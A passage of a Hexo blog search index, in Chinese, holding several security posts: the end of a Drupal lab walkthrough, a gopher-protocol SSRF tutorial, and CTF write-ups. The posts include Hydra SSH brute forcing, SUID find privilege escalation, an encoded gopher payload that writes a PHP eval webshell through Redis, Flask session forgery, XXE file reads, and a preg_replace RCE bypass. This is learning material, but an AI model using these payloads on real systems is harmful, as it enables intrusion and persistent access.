$S$D57b7lreyHHd9YxLVFT.mAZvE1O.QSaAIdQ98Hl0gccSpRpx0Br/</span><br></pre></td></tr></table></figure><p>得到加密后的密码， 接着我们登入mysql修改一下admin跟Fred的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br><span class="line">use drupaldb;update users set pass = &quot;$S$D1UQvb3x7lKoCSX6S9K.r.wB202Lsa/r7fkOj7CelJsSEMFDJjGv&quot; where name = &#x27;admin&#x27; or name = &#x27;Fred&#x27;;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712134857654.png"></p><p>修改成功</p><p><strong>法二：添加admin权限用户</strong> </p><p>drupal7版本在有个SQL注入的漏洞，可以添加一个admin权限的用户，适用版本7.31以下，我们可以在msf找一下这个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal               </span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712135304493.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 34992.py -p</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712135403150.png"></p><p>可以去这个链接里面找脚本</p><p>接下来我们就用修改好的密码登录，在右上角的content中找到flag3</p><p><img src="http://pic.bamboo22.top/image-20230712135735109.png"></p><p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p><p>提示了我们一些信息passwd和shadow，明显就是linux的文件</p><blockquote><p>&#x2F;etc&#x2F;passwd</p><p>该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读</p><p><a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释（超详细） (biancheng.net)</a></p><p>&#x2F;etc&#x2F;shadow</p><p>该文件存储了系统用户的密码等信息，只有root权限用户才能读取</p><p><a href="http://c.biancheng.net/view/840.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细） (biancheng.net)</a></p></blockquote><p><img src="http://pic.bamboo22.top/image-20230712140610272.png"></p><p>看到flag4，我们有两个方法拿到这个用户的密码，一个是爆破，另一个就是提权打开shadow文件查看密码</p><h3 id="五、用户密码爆破"><a href="#五、用户密码爆破" class="headerlink" title="五、用户密码爆破"></a>五、用户密码爆破</h3><p>事先参考SSH</p><p><a href="https://blog.csdn.net/li528405176/article/details/82810342?ops_request_misc=%7B%22request_id%22:%22165642658616782388078059%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165642658616782388078059&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-82810342-null-null.142%5Ev24%5Econtrol,157%5Ev15%5Enew_3&utm_term=SSH&spm=1018.2226.3001.4187">SSH简介及两种远程登录的方法_ssh -CSDN博客</a></p><p>利用工具Hydra爆破flag4的密码</p><p><a href="http://www.ha97.com/5186.html">（总结）Linux下的暴力密码在线破解工具Hydra详解 (ha97.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.85.130</span><br></pre></td></tr></table></figure><p>用hydra爆破</p><p><img src="http://pic.bamboo22.top/image-20230712141634364.png"></p><p>爆破出密码为orange，然后我们用kali连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.85.130</span><br></pre></td></tr></table></figure><p>输入orange登录成功</p><p><img src="http://pic.bamboo22.top/image-20230712142806332.png"><br><img src="http://pic.bamboo22.top/image-20230712142935462.png"></p><p>拿到flag4</p><h3 id="六、-Linux提权"><a href="#六、-Linux提权" class="headerlink" title="六、 Linux提权"></a>六、 Linux提权</h3><p>需要用到SUID提权，参考<a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p><p>利用find命令，找查具有SUID权限的可执行二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712143506711.png"></p><p>find比较常用，可以执行root权限的命令找查文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br><span class="line"></span><br><span class="line">这里找查什么文件不重要（但是是存在的文件），只需要格式对，然后后面加上-exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712143644895.png"></p><p>成功提权，最后来找第五个flag</p><p><img src="http://pic.bamboo22.top/image-20230712143832624.png"></p><p>成功通关！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gopher协议</title>
      <link href="/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h1><h2 id="什么是gopher协议"><a href="#什么是gopher协议" class="headerlink" title="什么是gopher协议"></a>什么是gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><blockquote><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p></blockquote><p>但是gopher协议在各个语言中是有使用限制的。</p><table><thead><tr><th align="center">语言</th><th align="center">支持情况</th></tr></thead><tbody><tr><td align="center">PHP</td><td align="center">–wite-curlwrappers且php版本至少为5.3</td></tr><tr><td align="center">Java</td><td align="center">小于JDK1.7</td></tr><tr><td align="center">Curl</td><td align="center">低版本不支持</td></tr><tr><td align="center">Perl</td><td align="center">支持</td></tr><tr><td align="center">ASP.NET</td><td align="center">小于版本3</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--wite-curlwrappers：运用curl工具打开url流</span><br><span class="line">curl使用curl --version查看版本以及支持的协议</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709103328078.png"></p><p>上面说的curl低版本不支持gopher协议，但是我的Windows上的curl8.0.1也不支持</p><h2 id="gopher协议格式"><a href="#gopher协议格式" class="headerlink" title="gopher协议格式"></a>gopher协议格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><ul><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><h3 id="Gopher发送请求HTTP-GET请求："><a href="#Gopher发送请求HTTP-GET请求：" class="headerlink" title="Gopher发送请求HTTP GET请求："></a>Gopher发送请求HTTP GET请求：</h3><p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p><p>这里我在Ubuntu上curl发送gopher请求，Windows上监听</p><p><img src="http://pic.bamboo22.top/image-20230709114819492.png"></p><p><img src="http://pic.bamboo22.top/image-20230709114836425.png"></p><p>可以看到nc收到gopher发出的请求，但是第一个字符被吃了，所以我们使用gopher协议发送请求的时候要在url前面加入任意一个字符</p><p><strong>在gopher协议中发送http的数据</strong></p><ol><li>构造HTTP数据包</li><li>URL编码、替换回车换行为%0d%0a</li><li>发送gopher协议</li></ol><p>下面就来本地测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>找一个get请求数据包，抓包获取http请求内容</p><p><img src="http://pic.bamboo22.top/image-20230709115933147.png"></p><p>我们需要的只有Host之前的内容</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test.php?name=abc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure><p>将请求内容url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.130.1:2222/GET%20%2Ftest.php%3Fname%3Dabc%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0A</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol><li>问号（?）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li></ol><p><img src="http://pic.bamboo22.top/image-20230709120806524.png"></p><p><img src="http://pic.bamboo22.top/image-20230709120819415.png"></p><h3 id="Gopher发送请求HTTP-POST请求："><a href="#Gopher发送请求HTTP-POST请求：" class="headerlink" title="Gopher发送请求HTTP POST请求："></a>Gopher发送请求HTTP POST请求：</h3><p>同样本地测试</p><p>先用htttp发一个post请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709121501648.png"></p><p>用gopher协议发post请求必须的参数是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test.php?name=abc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"></span></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span>abc</span></span><br><span class="line"><span class="language-abnf"></span></span><br></pre></td></tr></table></figure><p>URL编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.130.1:2222/_POST%20%2Ftest.php%3Fname%3Dabc%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Aname%3Dabc%0D%0A</span><br></pre></td></tr></table></figure><p><strong>同样也需要将回车换行改为%0D%0A</strong></p><p><img src="http://pic.bamboo22.top/image-20230709122527643.png"></p><p><img src="http://pic.bamboo22.top/image-20230709122512471.png"></p><h2 id="利用gopher打redis"><a href="#利用gopher打redis" class="headerlink" title="利用gopher打redis"></a>利用gopher打redis</h2><p>先写一个含有ssrf的网页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;there&#x27;s a ssrf in url，try it!&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709172217577.png"></p><p>尝试输入百度，页面跳转</p><p><img src="http://pic.bamboo22.top/image-20230709172324389.png"></p><p>127.0.0.1，没有过滤</p><p><img src="http://pic.bamboo22.top/image-20230709172241142.png"></p><p>用dict可以直接探测靶机上的服务信息</p><p><img src="http://pic.bamboo22.top/image-20230709172548226.png"></p><p>攻击原理很简单，就是利用gopher协议模拟redis通信</p><p>接下来我们就来利用ssrf打reds，我们知道redis有好几种利用方式，这里我们就用写webshell来演示，其他的利用方式都是一样的原理</p><p>正常情况是连接攻击机的redis后执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n\n\n&lt;?php @eval($_POST[&#x27;redis&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">config set dir /www/admin/localhost_80/wwwroot  </span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>现在我们用gopher协议来模拟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.144.130/123.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_%25%37%33%25%36%35%25%37%34%25%32%30%25%37%38%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%34%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%32%37%25%37%32%25%36%35%25%36%34%25%36%39%25%37%33%25%32%37%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%66%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%35%66%25%33%38%25%33%30%25%32%66%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%32%30%25%32%30%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230709214147910.png"></p><p>访问超时</p><p>但是可以看到，已经成功把马写进去了</p><p>（我这里测试的时候没有用root权限是写不进去的，所以应该要求redis是root权限打开）</p><p><img src="http://pic.bamboo22.top/image-20230709213950761.png"></p><p>蚁剑连接成功<br><img src="http://pic.bamboo22.top/image-20230709214220247.png"></p><p>其他的利用方式也就是在打redis时将redis的连接换成用gopher模拟连接</p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SYCTF 2023 CarelessPy</title>
      <link href="/2024/01/22/%5BSYCTF2023%5DCarelessPy/"/>
      <url>/2024/01/22/%5BSYCTF2023%5DCarelessPy/</url>
      
        <content type="html"><![CDATA[<h2 id="SYCTF2023-CarelessPy"><a href="#SYCTF2023-CarelessPy" class="headerlink" title="[SYCTF2023]CarelessPy"></a>[SYCTF2023]CarelessPy</h2><p><img src="http://pic.bamboo22.top/image-20230610132618291.png"></p><p>打开环境说下载图片，但其实没有什么用</p><p>查看源码，发现 <code>/eval </code>和 <code>/login </code></p><p><img src="http://pic.bamboo22.top/image-20230610132711588.png"></p><p>进入 <code>/eval </code>发现是一个命令执行，但是只要传cmd就会报错</p><p><img src="http://pic.bamboo22.top/image-20230610132912069.png"><br><img src="http://pic.bamboo22.top/image-20230610133109243.png"></p><p>进入<code>/login</code>有一个登录框，但是登录不成功</p><p><img src="http://pic.bamboo22.top/image-20230610133013051.png"></p><p><img src="http://pic.bamboo22.top/image-20230610133036210.png"></p><p>在&#x2F;login中猜测这个应该就是flask的session伪造，伪造一个成功登陆的cookie从而实现登录，那需要的秘应该就是在&#x2F;eval中去找</p><p>我们先去&#x2F;eval</p><p>这里一个一个传参去试（至于为什么我也不知道），试到app就成功了</p><p><img src="http://pic.bamboo22.top/image-20230610133620126.png"></p><p>进到这儿继续试</p><p><img src="http://pic.bamboo22.top/image-20230610133656260.png"></p><p>得到这个后就进入一开始的下载页面，就能下载.pyc文件，注意这里需要yong<code>../</code>进行目录穿越，因为要将工作目录转到网站更目录，所以要退三次</p><p><img src="http://pic.bamboo22.top/image-20230610140216067.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/eval?cmd=app</span><br><span class="line">/eval?cmd=app/__pycache__</span><br><span class="line">/download?file=../../..//app/__pycache__/part.cpython-311.pyc</span><br></pre></td></tr></table></figure><p>成功后就会下载一个.pyc文件，直接开是打不开的，改成.txt就可以看了（里面的乱码是没用的）</p><p><img src="http://pic.bamboo22.top/image-20230610141330544.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:o2takuXX_donot_like_ntr</span><br></pre></td></tr></table></figure><p>找到秘钥</p><p>下面进到login界面，先登录失败，吧cookie复制下来</p><p><img src="http://pic.bamboo22.top/image-20230610142507231.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session；</span><br><span class="line">eyJpc2xvZ2luIjpmYWxzZX0.ZIQWEw.Ym12DU18w-DqMwu6aUkiOl36U38</span><br></pre></td></tr></table></figure><p>放到flask-session-manager里面去跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s <span class="string">&quot;o2takuXX_donot_like_ntr&quot;</span> -c <span class="string">&quot;eyJpc2xvZ2luIjpmYWxzZX0.ZIQWEw.Ym12DU18w-DqMwu6aUkiOl36U38&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;islogin&#x27;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;o2takuXX_donot_like_ntr&quot;</span> -t <span class="string">&quot;&#123;&#x27;islogin&#x27;: True&#125;&quot;</span></span><br><span class="line">eyJpc2xvZ2luIjp0cnVlfQ.ZIQZiQ.dcWvoUa9FO92Jdym53c9hHkeP2Q</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230610143508723.png"></p><p>将session的值改了之后就能成功登录了</p><p><img src="http://pic.bamboo22.top/image-20230610143643300.png"></p><p>进入&#x2F;th1s_1s_The_L4st_one看到XML，想到XXE漏洞，抓包</p><p><img src="http://pic.bamboo22.top/image-20230610170650880.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1     </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE fumo [</span><br><span class="line">&lt;!ENTITY a SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;fumo&gt;&lt;web&gt;&amp;a;</span><br><span class="line">&lt;/web&gt;&lt;/fumo&gt;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230610173502583.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NEEPU-CTF 2023 ezrce</title>
      <link href="/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/"/>
      <url>/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/</url>
      
        <content type="html"><![CDATA[<h2 id="NEEPU-CTF-2023-ezrce"><a href="#NEEPU-CTF-2023-ezrce" class="headerlink" title="[NEEPU-CTF 2023]ezrce"></a>[NEEPU-CTF 2023]ezrce</h2><p><img src="http://pic.bamboo22.top/image-20230603163808883.png"></p><p>打开环境后看到提交框，随便输入点东西</p><p><img src="http://pic.bamboo22.top/image-20230603163906121.png"></p><p>可以看到源码</p><p><code>$name1=preg_replace(&#39;/hahaha/e&#39;,$qaq,$name);</code></p><p><code>/e</code>说明能当做php代码执行，所以尝试命令执行</p><p>开始传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://45e4936d.clsadp.com/?key=1223    //get</span><br><span class="line">name=hahaha&amp;qaq=system(ls);             //post</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603165020984.png"></p><p>能够看到当前目录下的文件，但是ls更目录就看不到了，这里是<code>/</code>被过滤了</p><p>无参数rce</p><p>查看更目录下文件，其实就是构造一个<code>/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://45e4936d.clsadp.com/?key=1223</span><br><span class="line">name=hahaha&amp;qaq=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure><p>因为获取<code>/</code>有随机性，多刷新几次</p><p><img src="http://pic.bamboo22.top/image-20230603165302185.png"></p><p>看到flag后就想办法构造读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">将键值切换</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">随机抽取数组中元素</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603171138322.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">读文件</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230603172807967.png"></p><p>因为有随机性，放到burp里面去爆，根据响应长度来找<br>按理说应该这样就能找到了，但是实际操作时刷不出来flag，还没有解决这个问题</p><p>可以看到waf.php,看到里面过滤的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$poc</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|get_defined_vars|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$poc</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker! you die!&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/01/21/hello-world/"/>
      <url>/2024/01/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
